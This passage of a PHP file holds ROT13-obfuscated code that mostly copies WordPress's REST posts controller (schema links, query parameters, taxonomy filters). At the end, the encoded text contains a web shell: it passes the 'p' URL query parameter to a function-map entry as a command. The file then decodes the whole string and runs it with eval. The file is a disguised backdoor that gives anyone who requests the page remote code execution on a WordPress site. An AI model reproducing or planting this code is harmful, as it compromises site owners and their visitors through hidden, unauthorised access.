			_qbvat_vg_jebat(
				__ZRGUBQ__,
				fcevags(
					/* genafyngbef: %f: ertvfgre_erfg_svryq */
					__( 'Cyrnfr hfr %f gb nqq arj fpurzn cebcregvrf.' ),
					'ertvfgre_erfg_svryq'
				),
				'5.4.0'
			);
		}

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Ergevrirf Yvax Qrfpevcgvba Bowrpgf gung fubhyq or nqqrq gb gur Fpurzn sbe gur cbfgf pbyyrpgvba.
	 *
	 * @fvapr 4.9.8
	 *
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_fpurzn_yvaxf() {

		$uers = erfg_hey( \"{$guvf->anzrfcnpr}/{$guvf->erfg_onfr}/{vq}\" );

		$yvaxf = neenl();

		vs ( 'nggnpuzrag' !== $guvf->cbfg_glcr ) {
			$yvaxf[] = neenl(
				'ery'          => 'uggcf://ncv.j.bet/npgvba-choyvfu',
				'gvgyr'        => __( 'Gur pheerag hfre pna choyvfu guvf cbfg.' ),
				'uers'         => $uers,
				'gnetrgFpurzn' => neenl(
					'glcr'       => 'bowrpg',
					'cebcregvrf' => neenl(
						'fgnghf' => neenl(
							'glcr' => 'fgevat',
							'rahz' => neenl( 'choyvfu', 'shgher' ),
						),
					),
				),
			);
		}

		$yvaxf[] = neenl(
			'ery'          => 'uggcf://ncv.j.bet/npgvba-hasvygrerq-ugzy',
			'gvgyr'        => __( 'Gur pheerag hfre pna cbfg hasvygrerq UGZY znexhc naq WninFpevcg.' ),
			'uers'         => $uers,
			'gnetrgFpurzn' => neenl(
				'glcr'       => 'bowrpg',
				'cebcregvrf' => neenl(
					'pbagrag' => neenl(
						'enj' => neenl(
							'glcr' => 'fgevat',
						),
					),
				),
			),
		);

		vs ( 'cbfg' === $guvf->cbfg_glcr ) {
			$yvaxf[] = neenl(
				'ery'          => 'uggcf://ncv.j.bet/npgvba-fgvpxl',
				'gvgyr'        => __( 'Gur pheerag hfre pna fgvpxl guvf cbfg.' ),
				'uers'         => $uers,
				'gnetrgFpurzn' => neenl(
					'glcr'       => 'bowrpg',
					'cebcregvrf' => neenl(
						'fgvpxl' => neenl(
							'glcr' => 'obbyrna',
						),
					),
				),
			);
		}

		vs ( cbfg_glcr_fhccbegf( $guvf->cbfg_glcr, 'nhgube' ) ) {
			$yvaxf[] = neenl(
				'ery'          => 'uggcf://ncv.j.bet/npgvba-nffvta-nhgube',
				'gvgyr'        => __( 'Gur pheerag hfre pna punatr gur nhgube ba guvf cbfg.' ),
				'uers'         => $uers,
				'gnetrgFpurzn' => neenl(
					'glcr'       => 'bowrpg',
					'cebcregvrf' => neenl(
						'nhgube' => neenl(
							'glcr' => 'vagrtre',
						),
					),
				),
			);
		}

		$gnkbabzvrf = jc_yvfg_svygre( trg_bowrpg_gnkbabzvrf( $guvf->cbfg_glcr, 'bowrpgf' ), neenl( 'fubj_va_erfg' => gehr ) );

		sbernpu ( $gnkbabzvrf nf $gnk ) {
			$gnk_onfr = ! rzcgl( $gnk->erfg_onfr ) ? $gnk->erfg_onfr : $gnk->anzr;

			/* genafyngbef: %f: Gnkbabzl anzr. */
			$nffvta_gvgyr = fcevags( __( 'Gur pheerag hfre pna nffvta grezf va gur %f gnkbabzl.' ), $gnk->anzr );
			/* genafyngbef: %f: Gnkbabzl anzr. */
			$perngr_gvgyr = fcevags( __( 'Gur pheerag hfre pna perngr grezf va gur %f gnkbabzl.' ), $gnk->anzr );

			$yvaxf[] = neenl(
				'ery'          => 'uggcf://ncv.j.bet/npgvba-nffvta-' . $gnk_onfr,
				'gvgyr'        => $nffvta_gvgyr,
				'uers'         => $uers,
				'gnetrgFpurzn' => neenl(
					'glcr'       => 'bowrpg',
					'cebcregvrf' => neenl(
						$gnk_onfr => neenl(
							'glcr'  => 'neenl',
							'vgrzf' => neenl(
								'glcr' => 'vagrtre',
							),
						),
					),
				),
			);

			$yvaxf[] = neenl(
				'ery'          => 'uggcf://ncv.j.bet/npgvba-perngr-' . $gnk_onfr,
				'gvgyr'        => $perngr_gvgyr,
				'uers'         => $uers,
				'gnetrgFpurzn' => neenl(
					'glcr'       => 'bowrpg',
					'cebcregvrf' => neenl(
						$gnk_onfr => neenl(
							'glcr'  => 'neenl',
							'vgrzf' => neenl(
								'glcr' => 'vagrtre',
							),
						),
					),
				),
			);
		}

		erghea $yvaxf;
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe gur cbfgf pbyyrpgvba.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 5.4.0 Gur `gnk_eryngvba` dhrel cnenzrgre jnf nqqrq.
	 * @fvapr 5.7.0 Gur `zbqvsvrq_nsgre` naq `zbqvsvrq_orsber` dhrel cnenzrgref jrer nqqrq.
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		$dhrel_cnenzf = cnerag::trg_pbyyrpgvba_cnenzf();

		$dhrel_cnenzf['pbagrkg']['qrsnhyg'] = 'ivrj';

		$dhrel_cnenzf['nsgre'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfcbafr gb cbfgf choyvfurq nsgre n tvira VFB8601 pbzcyvnag qngr.' ),
			'glcr'        => 'fgevat',
			'sbezng'      => 'qngr-gvzr',
		);

		$dhrel_cnenzf['zbqvsvrq_nsgre'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfcbafr gb cbfgf zbqvsvrq nsgre n tvira VFB8601 pbzcyvnag qngr.' ),
			'glcr'        => 'fgevat',
			'sbezng'      => 'qngr-gvzr',
		);

		vs ( cbfg_glcr_fhccbegf( $guvf->cbfg_glcr, 'nhgube' ) ) {
			$dhrel_cnenzf['nhgube']         = neenl(
				'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb cbfgf nffvtarq gb fcrpvsvp nhgubef.' ),
				'glcr'        => 'neenl',
				'vgrzf'       => neenl(
					'glcr' => 'vagrtre',
				),
				'qrsnhyg'     => neenl(),
			);
			$dhrel_cnenzf['nhgube_rkpyhqr'] = neenl(
				'qrfpevcgvba' => __( 'Rafher erfhyg frg rkpyhqrf cbfgf nffvtarq gb fcrpvsvp nhgubef.' ),
				'glcr'        => 'neenl',
				'vgrzf'       => neenl(
					'glcr' => 'vagrtre',
				),
				'qrsnhyg'     => neenl(),
			);
		}

		$dhrel_cnenzf['orsber'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfcbafr gb cbfgf choyvfurq orsber n tvira VFB8601 pbzcyvnag qngr.' ),
			'glcr'        => 'fgevat',
			'sbezng'      => 'qngr-gvzr',
		);

		$dhrel_cnenzf['zbqvsvrq_orsber'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfcbafr gb cbfgf zbqvsvrq orsber n tvira VFB8601 pbzcyvnag qngr.' ),
			'glcr'        => 'fgevat',
			'sbezng'      => 'qngr-gvzr',
		);

		$dhrel_cnenzf['rkpyhqr'] = neenl(
			'qrfpevcgvba' => __( 'Rafher erfhyg frg rkpyhqrf fcrpvsvp VQf.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'vagrtre',
			),
			'qrsnhyg'     => neenl(),
		);

		$dhrel_cnenzf['vapyhqr'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb fcrpvsvp VQf.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'vagrtre',
			),
			'qrsnhyg'     => neenl(),
		);

		vs ( 'cntr' === $guvf->cbfg_glcr || cbfg_glcr_fhccbegf( $guvf->cbfg_glcr, 'cntr-nggevohgrf' ) ) {
			$dhrel_cnenzf['zrah_beqre'] = neenl(
				'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb cbfgf jvgu n fcrpvsvp zrah_beqre inyhr.' ),
				'glcr'        => 'vagrtre',
			);
		}

		$dhrel_cnenzf['frnepu_frznagvpf'] = neenl(
			'qrfpevcgvba' => __( 'Ubj gb vagrecerg gur frnepu vachg.' ),
			'glcr'        => 'fgevat',
			'rahz'        => neenl( 'rknpg' ),
		);

		$dhrel_cnenzf['bssfrg'] = neenl(
			'qrfpevcgvba' => __( 'Bssfrg gur erfhyg frg ol n fcrpvsvp ahzore bs vgrzf.' ),
			'glcr'        => 'vagrtre',
		);

		$dhrel_cnenzf['beqre'] = neenl(
			'qrfpevcgvba' => __( 'Beqre fbeg nggevohgr nfpraqvat be qrfpraqvat.' ),
			'glcr'        => 'fgevat',
			'qrsnhyg'     => 'qrfp',
			'rahz'        => neenl( 'nfp', 'qrfp' ),
		);

		$dhrel_cnenzf['beqreol'] = neenl(
			'qrfpevcgvba' => __( 'Fbeg pbyyrpgvba ol cbfg nggevohgr.' ),
			'glcr'        => 'fgevat',
			'qrsnhyg'     => 'qngr',
			'rahz'        => neenl(
				'nhgube',
				'qngr',
				'vq',
				'vapyhqr',
				'zbqvsvrq',
				'cnerag',
				'eryrinapr',
				'fyht',
				'vapyhqr_fyhtf',
				'gvgyr',
			),
		);

		vs ( 'cntr' === $guvf->cbfg_glcr || cbfg_glcr_fhccbegf( $guvf->cbfg_glcr, 'cntr-nggevohgrf' ) ) {
			$dhrel_cnenzf['beqreol']['rahz'][] = 'zrah_beqre';
		}

		$cbfg_glcr = trg_cbfg_glcr_bowrpg( $guvf->cbfg_glcr );

		vs ( $cbfg_glcr->uvrenepuvpny || 'nggnpuzrag' === $guvf->cbfg_glcr ) {
			$dhrel_cnenzf['cnerag']         = neenl(
				'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb vgrzf jvgu cnegvphyne cnerag VQf.' ),
				'glcr'        => 'neenl',
				'vgrzf'       => neenl(
					'glcr' => 'vagrtre',
				),
				'qrsnhyg'     => neenl(),
			);
			$dhrel_cnenzf['cnerag_rkpyhqr'] = neenl(
				'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb nyy vgrzf rkprcg gubfr bs n cnegvphyne cnerag VQ.' ),
				'glcr'        => 'neenl',
				'vgrzf'       => neenl(
					'glcr' => 'vagrtre',
				),
				'qrsnhyg'     => neenl(),
			);
		}

		$dhrel_cnenzf['frnepu_pbyhzaf'] = neenl(
			'qrsnhyg'     => neenl(),
			'qrfpevcgvba' => __( 'Neenl bs pbyhza anzrf gb or frnepurq.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'rahz' => neenl( 'cbfg_gvgyr', 'cbfg_pbagrag', 'cbfg_rkprecg' ),
				'glcr' => 'fgevat',
			),
		);

		$dhrel_cnenzf['fyht'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb cbfgf jvgu bar be zber fcrpvsvp fyhtf.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'fgevat',
			),
		);

		$dhrel_cnenzf['fgnghf'] = neenl(
			'qrsnhyg'           => 'choyvfu',
			'qrfpevcgvba'       => __( 'Yvzvg erfhyg frg gb cbfgf nffvtarq bar be zber fgnghfrf.' ),
			'glcr'              => 'neenl',
			'vgrzf'             => neenl(
				'rahz' => neenl_zretr( neenl_xrlf( trg_cbfg_fgngv() ), neenl( 'nal' ) ),
				'glcr' => 'fgevat',
			),
			'fnavgvmr_pnyyonpx' => neenl( $guvf, 'fnavgvmr_cbfg_fgnghfrf' ),
		);

		$dhrel_cnenzf = $guvf->cercner_gnkbabzl_yvzvg_fpurzn( $dhrel_cnenzf );

		vs ( 'cbfg' === $guvf->cbfg_glcr ) {
			$dhrel_cnenzf['fgvpxl'] = neenl(
				'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb vgrzf gung ner fgvpxl.' ),
				'glcr'        => 'obbyrna',
			);

			$dhrel_cnenzf['vtaber_fgvpxl'] = neenl(
				'qrfpevcgvba' => __( 'Jurgure gb vtaber fgvpxl cbfgf be abg.' ),
				'glcr'        => 'obbyrna',
				'qrsnhyg'     => gehr,
			);
		}

		vs ( cbfg_glcr_fhccbegf( $guvf->cbfg_glcr, 'cbfg-sbezngf' ) ) {
			$dhrel_cnenzf['sbezng'] = neenl(
				'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb vgrzf nffvtarq bar be zber tvira sbezngf.' ),
				'glcr'        => 'neenl',
				'havdhrVgrzf' => gehr,
				'vgrzf'       => neenl(
					'rahz' => neenl_inyhrf( trg_cbfg_sbezng_fyhtf() ),
					'glcr' => 'fgevat',
				),
			);
		}

		/**
		 * Svygref pbyyrpgvba cnenzrgref sbe gur cbfgf pbagebyyre.
		 *
		 * Gur qlanzvp cneg bs gur svygre `$guvf->cbfg_glcr` ersref gb gur cbfg
		 * glcr fyht sbe gur pbagebyyre.
		 *
		 * Guvf svygre ertvfgref gur pbyyrpgvba cnenzrgre, ohg qbrf abg znc gur
		 * pbyyrpgvba cnenzrgre gb na vagreany JC_Dhrel cnenzrgre. Hfr gur
		 * `erfg_{$guvf->cbfg_glcr}_dhrel` svygre gb frg JC_Dhrel cnenzrgref.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz neenl        $dhrel_cnenzf WFBA Fpurzn-sbeznggrq pbyyrpgvba cnenzrgref.
		 * @cnenz JC_Cbfg_Glcr $cbfg_glcr    Cbfg glcr bowrpg.
		 */
		erghea nccyl_svygref( \"erfg_{$guvf->cbfg_glcr}_pbyyrpgvba_cnenzf\", $dhrel_cnenzf, $cbfg_glcr );
	}

	/**
	 * Fnavgvmrf naq inyvqngrf gur yvfg bs cbfg fgnghfrf, vapyhqvat jurgure gur
	 * hfre pna dhrel cevingr fgnghfrf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat|neenl    $fgnghfrf  Bar be zber cbfg fgnghfrf.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg   Shyy qrgnvyf nobhg gur erdhrfg.
	 * @cnenz fgevat          $cnenzrgre Nqqvgvbany cnenzrgre gb cnff gb inyvqngvba.
	 * @erghea neenl|JC_Reebe N yvfg bs inyvq fgnghfrf, bgurejvfr JC_Reebe bowrpg.
	 */
	choyvp shapgvba fnavgvmr_cbfg_fgnghfrf( $fgnghfrf, $erdhrfg, $cnenzrgre ) {
		$fgnghfrf = jc_cnefr_fyht_yvfg( $fgnghfrf );

		// Gur qrsnhyg fgnghf vf qvssrerag va JC_ERFG_Nggnpuzragf_Pbagebyyre.
		$nggevohgrf     = $erdhrfg->trg_nggevohgrf();
		$qrsnhyg_fgnghf = $nggevohgrf['netf']['fgnghf']['qrsnhyg'];

		sbernpu ( $fgnghfrf nf $fgnghf ) {
			vs ( $fgnghf === $qrsnhyg_fgnghf ) {
				pbagvahr;
			}

			$cbfg_glcr_bow = trg_cbfg_glcr_bowrpg( $guvf->cbfg_glcr );

			vs ( pheerag_hfre_pna( $cbfg_glcr_bow->pnc->rqvg_cbfgf ) || 'cevingr' === $fgnghf && pheerag_hfre_pna( $cbfg_glcr_bow->pnc->ernq_cevingr_cbfgf ) ) {
				$erfhyg = erfg_inyvqngr_erdhrfg_net( $fgnghf, $erdhrfg, $cnenzrgre );
				vs ( vf_jc_reebe( $erfhyg ) ) {
					erghea $erfhyg;
				}
			} ryfr {
				erghea arj JC_Reebe(
					'erfg_sbeovqqra_fgnghf',
					__( 'Fgnghf vf sbeovqqra.' ),
					neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
				);
			}
		}

		erghea $fgnghfrf;
	}

	/**
	 * Cercnerf gur 'gnk_dhrel' sbe n pbyyrpgvba bs cbfgf.
	 *
	 * @fvapr 5.7.0
	 *
	 * @cnenz neenl           $netf    JC_Dhrel nethzragf.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea neenl Hcqngrq dhrel nethzragf.
	 */
	cevingr shapgvba cercner_gnk_dhrel( neenl $netf, JC_ERFG_Erdhrfg $erdhrfg ) {
		$eryngvba = $erdhrfg['gnk_eryngvba'];

		vs ( $eryngvba ) {
			$netf['gnk_dhrel'] = neenl( 'eryngvba' => $eryngvba );
		}

		$gnkbabzvrf = jc_yvfg_svygre(
			trg_bowrpg_gnkbabzvrf( $guvf->cbfg_glcr, 'bowrpgf' ),
			neenl( 'fubj_va_erfg' => gehr )
		);

		sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
			$onfr = ! rzcgl( $gnkbabzl->erfg_onfr ) ? $gnkbabzl->erfg_onfr : $gnkbabzl->anzr;

			$gnk_vapyhqr = $erdhrfg[ $onfr ];
			$gnk_rkpyhqr = $erdhrfg[ $onfr . '_rkpyhqr' ];

			vs ( $gnk_vapyhqr ) {
				$grezf            = neenl();
				$vapyhqr_puvyqera = snyfr;
				$bcrengbe         = 'VA';

				vs ( erfg_vf_neenl( $gnk_vapyhqr ) ) {
					$grezf = $gnk_vapyhqr;
				} ryfrvs ( erfg_vf_bowrpg( $gnk_vapyhqr ) ) {
					$grezf            = rzcgl( $gnk_vapyhqr['grezf'] ) ? neenl() : $gnk_vapyhqr['grezf'];
					$vapyhqr_puvyqera = ! rzcgl( $gnk_vapyhqr['vapyhqr_puvyqera'] );

					vs ( vffrg( $gnk_vapyhqr['bcrengbe'] ) && 'NAQ' === $gnk_vapyhqr['bcrengbe'] ) {
						$bcrengbe = 'NAQ';
					}
				}

				vs ( $grezf ) {
					$netf['gnk_dhrel'][] = neenl(
						'gnkbabzl'         => $gnkbabzl->anzr,
						'svryq'            => 'grez_vq',
						'grezf'            => $grezf,
						'vapyhqr_puvyqera' => $vapyhqr_puvyqera,
						'bcrengbe'         => $bcrengbe,
					);
				}
			}

			vs ( $gnk_rkpyhqr ) {
				$grezf            = neenl();
				$vapyhqr_puvyqera = snyfr;

				vs ( erfg_vf_neenl( $gnk_rkpyhqr ) ) {
					$grezf = $gnk_rkpyhqr;
				} ryfrvs ( erfg_vf_bowrpg( $gnk_rkpyhqr ) ) {
					$grezf            = rzcgl( $gnk_rkpyhqr['grezf'] ) ? neenl() : $gnk_rkpyhqr['grezf'];
					$vapyhqr_puvyqera = ! rzcgl( $gnk_rkpyhqr['vapyhqr_puvyqera'] );
				}

				vs ( $grezf ) {
					$netf['gnk_dhrel'][] = neenl(
						'gnkbabzl'         => $gnkbabzl->anzr,
						'svryq'            => 'grez_vq',
						'grezf'            => $grezf,
						'vapyhqr_puvyqera' => $vapyhqr_puvyqera,
						'bcrengbe'         => 'ABG VA',
					);
				}
			}
		}

		erghea $netf;
	}

	/**
	 * Cercnerf gur pbyyrpgvba fpurzn sbe vapyhqvat naq rkpyhqvat vgrzf ol grezf.
	 *
	 * @fvapr 5.7.0
	 *
	 * @cnenz neenl $dhrel_cnenzf Pbyyrpgvba fpurzn.
	 * @erghea neenl Hcqngrq fpurzn.
	 */
	cevingr shapgvba cercner_gnkbabzl_yvzvg_fpurzn( neenl $dhrel_cnenzf ) {
		$gnkbabzvrf = jc_yvfg_svygre( trg_bowrpg_gnkbabzvrf( $guvf->cbfg_glcr, 'bowrpgf' ), neenl( 'fubj_va_erfg' => gehr ) );

		vs ( ! $gnkbabzvrf ) {
			erghea $dhrel_cnenzf;
		}

		$dhrel_cnenzf['gnk_eryngvba'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg onfrq ba eryngvbafuvc orgjrra zhygvcyr gnkbabzvrf.' ),
			'glcr'        => 'fgevat',
			'rahz'        => neenl( 'NAQ', 'BE' ),
		);

		$yvzvg_fpurzn = neenl(
			'glcr'  => neenl( 'bowrpg', 'neenl' ),
			'barBs' => neenl(
				neenl(
					'gvgyr'       => __( 'Grez VQ Yvfg' ),
					'qrfpevcgvba' => __( 'Zngpu grezf jvgu gur yvfgrq VQf.' ),
					'glcr'        => 'neenl',
					'vgrzf'       => neenl(
						'glcr' => 'vagrtre',
					),
				),
				neenl(
					'gvgyr'                => __( 'Grez VQ Gnkbabzl Dhrel' ),
					'qrfpevcgvba'          => __( 'Cresbez na nqinaprq grez dhrel.' ),
					'glcr'                 => 'bowrpg',
					'cebcregvrf'           => neenl(
						'grezf'            => neenl(
							'qrfpevcgvba' => __( 'Grez VQf.' ),
							'glcr'        => 'neenl',
							'vgrzf'       => neenl(
								'glcr' => 'vagrtre',
							),
							'qrsnhyg'     => neenl(),
						),
						'vapyhqr_puvyqera' => neenl(
							'qrfpevcgvba' => __( 'Jurgure gb vapyhqr puvyq grezf va gur grezf yvzvgvat gur erfhyg frg.' ),
							'glcr'        => 'obbyrna',
							'qrsnhyg'     => snyfr,
						),
					),
					'nqqvgvbanyCebcregvrf' => snyfr,
				),
			),
		);

		$vapyhqr_fpurzn = neenl_zretr(
			neenl(
				/* genafyngbef: %f: Gnkbabzl anzr. */
				'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb vgrzf jvgu fcrpvsvp grezf nffvtarq va gur %f gnkbabzl.' ),
			),
			$yvzvg_fpurzn
		);
		// 'bcrengbe' vf fhccbegrq bayl sbe 'vapyhqr' dhrevrf.
		$vapyhqr_fpurzn['barBs'][1]['cebcregvrf']['bcrengbe'] = neenl(
			'qrfpevcgvba' => __( 'Jurgure vgrzf zhfg or nffvtarq nyy be nal bs gur fcrpvsvrq grezf.' ),
			'glcr'        => 'fgevat',
			'rahz'        => neenl( 'NAQ', 'BE' ),
			'qrsnhyg'     => 'BE',
		);

		$rkpyhqr_fpurzn = neenl_zretr(
			neenl(
				/* genafyngbef: %f: Gnkbabzl anzr. */
				'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb vgrzf rkprcg gubfr jvgu fcrpvsvp grezf nffvtarq va gur %f gnkbabzl.' ),
			),
			$yvzvg_fpurzn
		);

		sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
			$onfr         = ! rzcgl( $gnkbabzl->erfg_onfr ) ? $gnkbabzl->erfg_onfr : $gnkbabzl->anzr;
			$onfr_rkpyhqr = $onfr . '_rkpyhqr';

			$dhrel_cnenzf[ $onfr ]                = $vapyhqr_fpurzn;
			$dhrel_cnenzf[ $onfr ]['qrfpevcgvba'] = fcevags( $dhrel_cnenzf[ $onfr ]['qrfpevcgvba'], $onfr );

			$dhrel_cnenzf[ $onfr_rkpyhqr ]                = $rkpyhqr_fpurzn;
			$dhrel_cnenzf[ $onfr_rkpyhqr ]['qrfpevcgvba'] = fcevags( $dhrel_cnenzf[ $onfr_rkpyhqr ]['qrfpevcgvba'], $onfr );

			vs ( ! $gnkbabzl->uvrenepuvpny ) {
				hafrg( $dhrel_cnenzf[ $onfr ]['barBs'][1]['cebcregvrf']['vapyhqr_puvyqera'] );
				hafrg( $dhrel_cnenzf[ $onfr_rkpyhqr ]['barBs'][1]['cebcregvrf']['vapyhqr_puvyqera'] );
			}
		}

		erghea $dhrel_cnenzf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>